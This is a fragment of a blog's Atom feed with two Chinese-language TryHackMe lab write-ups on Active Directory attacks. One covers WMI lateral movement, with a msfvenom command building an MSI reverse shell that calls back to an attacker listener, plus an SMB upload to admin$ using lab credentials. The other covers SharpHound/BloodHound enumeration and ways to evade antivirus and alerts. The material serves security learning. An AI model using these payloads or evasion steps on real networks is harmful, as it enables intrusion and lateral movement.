+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$username&lt;/span&gt; = &lt;span class=&#34;token string&#34;&gt;&#39;ZA.TRYHACKME.COM\t1_corine.waters&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#做好凭据生成&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$password&lt;/span&gt; = &lt;span class=&#34;token string&#34;&gt;&#39;Korine.1994&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$securePassword&lt;/span&gt; = &lt;span class=&#34;token function&#34;&gt;ConvertTo-SecureString&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$password&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;AsPlainText &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Force&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$credential&lt;/span&gt; = &lt;span class=&#34;token function&#34;&gt;New-Object&lt;/span&gt; System&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Management&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Automation&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;PSCredential &lt;span class=&#34;token variable&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$securePassword&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 做一个连接协议的 判定和选择  并且得到对应的会话&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$Opt&lt;/span&gt; = &lt;span class=&#34;token function&#34;&gt;New-CimSessionOption&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Protocol DCOM&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$Session&lt;/span&gt; = &lt;span class=&#34;token function&#34;&gt;New-Cimsession&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;ComputerName thmiis&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;za&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;tryhackme&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;com &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Credential &lt;span class=&#34;token variable&#34;&gt;$credential&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;SessionOption &lt;span class=&#34;token variable&#34;&gt;$Opt&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;ErrorAction Stop&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;在 cmd 中写一个 ps1 脚本，直接批量执行&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;验证连接:&lt;/em&gt;&lt;/p&gt;
+&lt;h6 id=&#34;1-使用-wmic-命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-使用-wmic-命令&#34;&gt;#&lt;/a&gt; 1. 使用  &lt;code&gt;wmic&lt;/code&gt;  命令&lt;/h6&gt;
+&lt;p&gt;打开命令提示符（cmd）并输入以下命令：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;wmic os get caption&lt;/code&gt; &lt;br /&gt;
+ 如果你能看到 Windows 操作系统的名称和版本，这表明你已成功连接到 WMI。&lt;/p&gt;
+&lt;h6 id=&#34;2-使用-powershell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-使用-powershell&#34;&gt;#&lt;/a&gt; 2. 使用 PowerShell&lt;/h6&gt;
+&lt;p&gt;打开 PowerShell 并输入以下命令：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Get-WmiObject -Class Win32_OperatingSystem&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&#34;计划任务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#计划任务&#34;&gt;#&lt;/a&gt; 计划任务&lt;/h4&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240910195837.png&#34; alt=&#34;image.png&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;其实就是连接上 wmi 之后可以看到一个相应的 session 可以看到，直接利用 session 进行系统相关的管理。此时我们可以测试一下，我们创建的用户登录对应 thmiis 系统。&lt;br /&gt;
+具体脚本 [[# 创建计划任务]]&lt;br /&gt;
+&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240910200936.png&#34; alt=&#34;image.png&#34; /&gt;&lt;br /&gt;
+ 可以看到我们的计划任务成功执行。 已经成功登录对应的 thmiis 系统。&lt;/p&gt;
+&lt;h4 id=&#34;安装msi&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#安装msi&#34;&gt;#&lt;/a&gt; 安装 msi&lt;/h4&gt;
+&lt;p&gt;我刚才仔细地考虑了一下，如果说是为了隐蔽的话。使用 wmi 进行一些系统管理，并且利用 msi 安装程序更隐蔽。&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msfvenom &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt; windows/shell/reverse_tcp &lt;span class=&#34;token parameter variable&#34;&gt;-f&lt;/span&gt; msi &lt;span class=&#34;token assign-left variable&#34;&gt;LHOST&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10.50&lt;/span&gt;.148.56 &lt;span class=&#34;token assign-left variable&#34;&gt;LPORT&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4444&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-o&lt;/span&gt; k1t0service.msi&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;需要把 msi 先传递上去。&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;smbclient &lt;span class=&#34;token parameter variable&#34;&gt;-c&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;put k1t0service.msi&#39;&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-U&lt;/span&gt; t1_corine.waters &lt;span class=&#34;token parameter variable&#34;&gt;-W&lt;/span&gt; ZA &lt;span class=&#34;token string&#34;&gt;&#39;//thmiis.za.tryhackme.com/admin$/&#39;&lt;/span&gt; Korine.1994&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;可以看到，我们之前已经连接到了 wmi 的 session , 具体的监听不做赘述。&lt;br /&gt;
+此时就直接可以调用 session, 直接开始安装对应的 msi 程序。[[WMI# 安装 msi 程序]]&lt;/p&gt;
+</content>
+        <category term="横向移动" />
+        <updated>2024-09-10T13:20:56.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://k1t0111.github.io/2024/09/08/AD%E5%9F%9F%E6%9E%9A%E4%B8%BE%E4%BF%A1%E6%81%AF-BloodHound/</id>
+        <title>AD域枚举信息-BloodHound</title>
+        <link rel="alternate" href="https://k1t0111.github.io/2024/09/08/AD%E5%9F%9F%E6%9E%9A%E4%B8%BE%E4%BF%A1%E6%81%AF-BloodHound/"/>
+        <content type="html">&lt;p&gt;最后，我们将研究使用&lt;a href=&#34;https://github.com/BloodHoundAD/BloodHound&#34;&gt; Bloodhound&lt;/a&gt; 执行 AD 枚举。 Bloodhound 是迄今为止最强大的 AD 枚举工具，当它于 2016 年发布时，它永远改变了 AD 枚举格局。&lt;/p&gt;
+&lt;h4 id=&#34;bloodhound-history-寻血猎犬的历史&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bloodhound-history-寻血猎犬的历史&#34;&gt;#&lt;/a&gt; Bloodhound History 寻血猎犬的历史&lt;/h4&gt;
+&lt;p&gt;在相当长的一段时间内，红队队员（不幸的是，攻击者）占据了上风。以至于微软在其高级威胁防护解决方案中集成了他们自己版本的 Bloodhound。这一切都归结为以下这句话：&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;“防御者用列表思考，攻击者用图表思考。” - 未知&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Bloodhound 允许攻击者（现在也包括防御者）通过互连节点以图形格式可视化 AD 环境。每个连接都是一条可能的路径，可用于实现目标。相比之下，防御者使用列表，例如域管理员列表或环境中所有主机的列表。&lt;br /&gt;
+这种基于图的思维为攻击者打开了一个世界。它允许进行两阶段攻击。在第一阶段，攻击者会执行网络钓鱼攻击以获得枚举 AD 信息的初始条目。这个初始有效负载通常非常嘈杂，并且会在攻击者执行除泄露枚举数据之外的任何操作之前被蓝队检测到并包含在内。然而，攻击者现在可以离线使用这些数据以图形格式创建攻击路径，准确显示所需的步骤和跳跃。在第二次网络钓鱼活动中利用这些信息，攻击者通常可以在突破后几分钟内达到他们的目标。它通常比蓝队收到第一个警报的速度还要快。这就是图表思维的力量，这就是为什么这么多蓝队也开始使用这些类型的工具来更好地了解他们的安全态势。&lt;/p&gt;
+&lt;h4 id=&#34;sharphound-猎犬&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sharphound-猎犬&#34;&gt;#&lt;/a&gt; Sharphound 猎犬&lt;/h4&gt;
+&lt;p&gt;您经常会听到用户将 Sharphound 和 Bloodhound 互换使用。然而，它们并不相同。 Sharphound 是 Bloodhound 的枚举工具。它用于枚举 AD 信息，然后可以在 Bloodhound 中直观地显示这些信息。 Bloodhound 是用于显示 AD 攻击图的实际 GUI 。因此，我们首先需要学习如何使用 Sharphound 来枚举 AD ，然后才能使用 Bloodhound 直观地看到结果。&lt;/p&gt;
+&lt;p&gt;** 共有三种不同的 Sharphound&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Sharphound.ps1&lt;/strong&gt; - 用于运行 Sharphound 的 PowerShell 脚本。不过，最新版本的 Sharphound 已经停止发布 Powershell 脚本版本。该版本非常适合与 RAT 一起使用，因为脚本可以直接加载到内存中，从而逃避磁盘上的 AV 扫描。&lt;br /&gt;
+&lt;em&gt;解释一下 AV 扫描&lt;/em&gt; 防病毒软件是一个程序或一组程序，旨在防止、搜索、检测和删除软件病毒以及其他恶意软件（如蠕虫、木马、广告软件等）。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Sharphound.exe&lt;/strong&gt; - 用于运行 Sharphound 的 Windows 可执行版本。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;AzureHound.ps1&lt;/strong&gt; - 用于运行 Sharphound for Azure（Microsoft 云计算服务）实例的 PowerShell 脚本。 Bloodhound 可以提取从 Azure 枚举的数据，以查找与 Azure 身份和访问管理配置相关的攻击路径。&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;注意：您的 Bloodhound 和 Sharphound 版本必须匹配才能获得最佳结果。通常会对 Bloodhound 进行更新，这意味着旧的 Sharphound 结果无法被摄取。该网络是使用 Bloodhound v4.1.0 创建的。请确保将此版本与 Sharphound 结果一起使用。&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;在评估中使用这些收集器脚本时，这些文件很可能被检测为恶意软件并向蓝队发出警报。这又是我们未加入域的 Windows 计算机可以提供帮助的地方。我们可以使用 &lt;code&gt;runas&lt;/code&gt;  命令注入 AD 凭据并将 Sharphound 指向域控制器。由于我们控制这台 Windows 计算机，因此我们可以禁用 AV 或为特定文件或文件夹创建例外，这已在 THMJMP1 计算机上为您执行。您可以在该主机上的 &lt;code&gt;C:\Tools\&lt;/code&gt;  目录中找到 Sharphound 二进制文件。我们将使用 SharpHound.exe 版本进行枚举，但也可以随意使用其他两个版本。我们将执行 Sharphound，如下所示：&lt;/p&gt;
+&lt;p&gt;因此可以看到想要使用猎狗 这个自动化 AD 工具我们可能还必须要找一个非域的机器，否则就会被杀掉或者是域发生警告.&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Sharphound&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;exe &lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;CollectionMethods &amp;lt;Methods&gt; &lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;Domain za&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;tryhackme&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;com &lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;ExcludeDCs&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;*** 相关参数解释:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;CollectionMethods - 确定 Sharphound 将收集哪种数据。最常见的选项是 “默认” 或 “全部”。另外，由于 Sharphound 会缓存信息，因此一旦第一次运行完成，您只能使用 Session 收集方法来检索新的用户会话以加快该过程。&lt;/li&gt;
+&lt;li&gt;域 - 在这里，我们指定要枚举的域。在某些情况下，您可能想要枚举与您的现有域信任的父域或其他域。您可以通过更改此参数来告诉 Sharphound 应枚举​​哪个域。&lt;/li&gt;
+&lt;li&gt;ExcludeDCs - 这将指示 Sharphound 不要接触域控制器，从而降低 Sharphound 运行引发警报的可能性。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;相关所有参数:&lt;a href=&#34;https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html&#34;&gt;https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;%E7%8C%8E%E7%8B%97.md&#34;&gt;猎狗&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;使用上一个任务中的 SSH PowerShell 会话，将 Sharphound 二进制文件复制到 AD 用户的文档目录，当然我不知道是不是必须把这个放到用户目录文档中，才能体现使用的相关域用户名义去运行。&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;PS&lt;/span&gt; C:\&gt; &lt;span class=&#34;token function&#34;&gt;copy&lt;/span&gt; C:\Tools\Sharphound&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;exe ~\Documents\ &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;PS&lt;/span&gt; C:\&gt; cd ~\Documents\ &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;PS&lt;/span&gt; C:\Users\gordon&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;stevens\Documents&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;现在是一切都准备好了，虽然目前我们的服务器已经加入到了域中，但是此时我们使用的猎狗脚本。并未触发报警。我们直接使用 我们将使用 All 和 Session 收集方法运行 Sharphound：&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;SharpHound&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;exe &lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;CollectionMethods All &lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;Domain za&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;tryhackme&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;com &lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;ExcludeDCs&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;Sharphound 执行枚举大约需要 1 分钟。在较大的组织中，第一次执行可能需要更长的时间，甚至几个小时。完成后，您将在执行 Sharphound 的同一文件夹中获得一个带时间戳的 ZIP 文件。&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240831103147.png&#34; alt=&#34;image.png&#34; /&gt;&lt;br /&gt;
+ 我们现在可以使用 Bloodhound 提取此 ZIP，以直观地向我们展示攻击路径。这就是我们最开始提到的一种思想，图表的思想，我们使用猎狗去嗅探之后使用 blood 进行一个相关的信息的展示之后显示攻击路径。&lt;/p&gt;
+&lt;h4 id=&#34;bloodhound-寻血猎犬&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bloodhound-寻血猎犬&#34;&gt;#&lt;/a&gt; Bloodhound 寻血猎犬&lt;/h4&gt;
+&lt;p&gt;如前所述，Bloodhound 是一个 GUI，允许我们导入 Sharphound 捕获的数据并将其可视化到攻击路径中。 Bloodhound 使用 Neo4j 作为其后端数据库和图形系统。 Neo4j 是一个图形数据库管理系统。如果您使用 AttackBox，则可以使用 Dock 中的红色 Bloodhound 图标来启动它。在所有其他情况下，请确保您的攻击计算机上安装并配置了 Bloodhound 和 neo4j。无论哪种方式，了解后台发生的事情都是有好处的。在启动 Bloodhound 之前，我们需要加载 Neo4j：&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;neo4j console&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240831110258.png&#34; alt=&#34;image.png&#34; /&gt;&lt;br /&gt;
+ 此时已经启动数据库管理工具&lt;br /&gt;
+在另一个终端选项卡中，运行 &lt;code&gt;bloodhound --no-sandbox&lt;/code&gt;  。这将向您显示身份验证 GUI ：&lt;br /&gt;
+&lt;img loading=&#34;lazy&#34; data-src=&#34;https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/39f261aecedccbaf118eb2ee69d55129.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;neo4j 数据库的默认凭据为 &lt;code&gt;neo4j:neo4j&lt;/code&gt;  。使用它在 Bloodhound 中进行身份验证。要导入我们的结果，您需要从 Windows 主机恢复 ZIP 文件。最简单的方法是在 AttackBox 上使用 SCP 命令：&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;scp&lt;/span&gt; grace.brooks@THMJMP1.za.tryhackme.com:c:/Tools/20240831083709_BloodHound.zip &lt;span class=&#34;token builtin class-name&#34;&gt;.&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;一旦您提供密码，这会将结果复制到您当前的工作目录。将 ZIP 文件拖放到 Bloodhound GUI 上以导入 Bloodhound。它将显示正在提取文件并启动导入。导入所有 JSON 文件后，我们可以开始使用 Bloodhound 枚举该特定域的攻击路径。&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240831110537.png&#34; alt=&#34;image.png&#34; /&gt;&lt;/p&gt;
+&lt;h4 id=&#34;attack-paths-攻击路径&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#attack-paths-攻击路径&#34;&gt;#&lt;/a&gt; Attack Paths 攻击路径&lt;/h4&gt;
+&lt;p&gt;Bloodhound 可以显示多种攻击路径。按 “搜索节点” 旁边的三个条纹将显示选项。第一个选项卡向我们显示有关当前进口的信息&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/5d695d25afebc2b1dfc7cb408704e755.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
+Bloodhound 可以显示多种攻击路径。按 “搜索节点” 旁边的三个条纹将显示选项。第一个选项卡向我们显示有关当前进口的信息&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/a6e1af6f79653eeedb18ac9c3be7a038.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Overview&lt;/strong&gt; - Provides summaries information such as the number of active sessions the account has and if it can reach high-value targets.&lt;br /&gt;
+&lt;strong&gt; 概述&lt;/strong&gt; - 提供摘要信息，例如帐户拥有的活动会话数以及是否可以达到高价值目标。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Node Properties&lt;/strong&gt; - Shows information regarding the AD account, such as the display name and the title.&lt;br /&gt;
+&lt;strong&gt; 节点属性&lt;/strong&gt; - 显示有关 AD 帐户的信息，例如显示名称和标题。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Extra Properties&lt;/strong&gt; - Provides more detailed AD information such as the distinguished name and when the account was created.&lt;br /&gt;
+&lt;strong&gt; 额外属性&lt;/strong&gt; - 提供更详细的 AD 信息，例如可分辨名称和创建帐户的时间。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Group Membership&lt;/strong&gt; - Shows information regarding the groups that the account is a member of.&lt;br /&gt;
+&lt;strong&gt; 组成员资格&lt;/strong&gt; - 显示有关帐户所属组的信息。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Local Admin Rights&lt;/strong&gt; - Provides information on domain-joined hosts where the account has administrative privileges.&lt;br /&gt;
+&lt;strong&gt; 本地管理员权限&lt;/strong&gt; - 提供有关帐户具有管理权限的已加入域的主机的信息。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Execution Rights&lt;/strong&gt; - Provides information on special privileges such as the ability to RDP into a machine.&lt;br /&gt;
+&lt;strong&gt; 执行权限&lt;/strong&gt; - 提供有关特殊权限的信息，例如通过 RDP 访问计算机的能力。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Outbound Control Rights&lt;/strong&gt; - Shows information regarding AD objects where this account has permissions to modify their attributes.&lt;br /&gt;
+&lt;strong&gt; 出站控制权限&lt;/strong&gt; - 显示有关此帐户有权修改其属性的 AD 对象的信息。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Inbound Control Rights&lt;/strong&gt; -  Provides information regarding AD objects that can modify the attributes of this account.&lt;br /&gt;
+&lt;strong&gt; 入站控制权限&lt;/strong&gt; - 提供有关可修改此帐户属性的 AD 对象的信息。&lt;br /&gt;
+如果您想了解每个类别的更多信息，可以按信息查询旁边的数字。例如，让我们看看与我们的帐户关联的组成员身份。通过按 “First Degree Group Membership” 旁边的数字，我们可以看到我们的帐户是两个组的成员。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;接下来，我们将研究分析查询。这些是 Bloodhound 的创建者自己编写的查询，用于列举有用的信息&lt;br /&gt;
+&lt;img loading=&#34;lazy&#34; data-src=&#34;https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/247be9dc8f34b8de181516199b0664dd.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;在 “域信息” 部分下，我们可以运行 “查找所有域管理员” 查询。请注意，您可以按 LeftCtrl 更改标签显示设置。&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/9e4a7afd2acd099df71dc70d9eccf705.png&#34; alt=&#34;Bloodhound&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;图标称为节点，线称为边。让我们更深入地了解 Bloodhound 向我们展示的内容。有一个用户名为&lt;strong&gt; T0_TINUS.GREEN&lt;/strong&gt; 的 AD 用户帐户，它是&lt;strong&gt; Tier 0 ADMINS&lt;/strong&gt; 组的成员。但是，该组是&lt;strong&gt; DOMAIN ADMINS&lt;/strong&gt; 组中的嵌套组，这意味着属于&lt;strong&gt;第 0 层 ADMINS&lt;/strong&gt; 组的所有用户实际上都是 DA。&lt;br /&gt;
+此外，还有一个用户名为&lt;strong&gt; ADMINISTRATOR&lt;/strong&gt; 的附加 AD 帐户，该帐户属于&lt;strong&gt; DOMAIN ADMINS&lt;/strong&gt; 组。因此，如果我们想获得 DA 权限，我们的攻击面中可能会尝试破坏两个帐户。由于&lt;strong&gt;管理员&lt;/strong&gt;帐户是内置帐户，因此我们可能会关注用户帐户。&lt;/p&gt;
+&lt;p&gt;前面的任务中讨论的每个 AD 对象都可以是 Bloodhound 中的一个节点，并且每个对象都有一个不同的图标来描述其对象类型。如果我们想制定攻击路径，我们需要查看当前位置和我们拥有的特权与我们想要去的地方之间的可用边缘。 Bloodhound 有各种可用的边缘，可以通过过滤器图标访问：&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c21ccdbdd84a6e709d39fdff14764cea.png&#34; alt=&#34;Bloodhound&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;随着新攻击媒介的发现，这些内容也会不断更新。我们将考虑在未来的网络中利用这些不同的优势。但是，让我们看看仅使用默认边和一些特殊边的最基本的攻击路径。我们将在 Bloodhound 中运行搜索来枚举攻击路径。按路径图标即可进行路径搜索&lt;/p&gt;
+&lt;p&gt;我们的起始节点将是我们的 AD 用户名，我们的结束节点将是&lt;strong&gt;第 1 层 ADMINS&lt;/strong&gt; 组，因为该组对服务器具有管理权限。&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/b7ae2e4f8e1824e25e69fa69d95c4a4e.png&#34; alt=&#34;Bloodhound&#34; /&gt;&lt;/p&gt;
